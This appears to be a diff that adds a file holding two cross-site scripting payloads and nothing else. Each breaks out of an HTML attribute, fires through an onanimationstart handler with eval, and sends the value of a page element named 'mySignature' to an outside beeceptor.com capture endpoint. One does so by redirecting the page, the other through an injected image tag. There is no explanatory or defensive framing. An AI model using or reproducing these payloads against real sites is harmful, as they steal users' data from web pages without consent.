@@ -1,0 +1,7 @@
+" style=animation-name:lds-ring onanimationstart=eval("$(document).ready(function(){window.location.replace(`https://aduhaduh.free.beeceptor.com/`+document.getElementById(`mySignature`).value)})") x="
+
+
+
+
+
+" style=animation-name:lds-ring onanimationstart=eval('document.write(`\<img`+String.fromCharCode(32)+`src=\'https://aduhasdasd.free.beeceptor.com/?data=`+document.getElementById(`mySignature`).value+`\'/\>`)') x="
